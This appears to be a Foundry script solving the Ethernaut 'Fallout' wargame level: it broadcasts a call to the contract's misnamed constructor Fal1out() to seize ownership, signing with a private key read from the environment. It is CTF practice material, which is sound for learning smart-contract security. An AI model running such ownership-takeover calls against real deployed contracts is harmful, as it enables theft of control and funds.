// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.5;

import "../../lib/forge-std/src//Script.sol";
import {Fallout} from "../src/L3__Fallout.sol";

// Claim ownership of the contract below to complete this level.

contract L2_Solution__Fallback is Script {
    Fallout public fallout =
        Fallout(0x110477B5827116F927734bd6DAb7D7e9ef7a451C);

    function run() public {
        address _robber = vm.envAddress("ACCOUNT");
        address _owner = stealOwnership();

        require(_owner == _robber, "2 :: steal failed :(...");
    }

    function stealOwnership() public returns (address _owner) {
        uint256 _robber = vm.envUint("PRIV_KEY");

        _owner = fallout.owner();
        vm.startBroadcast(_robber);

        fallout.Fal1out();

        vm.stopBroadcast();
        _owner = fallout.owner();
    }
}
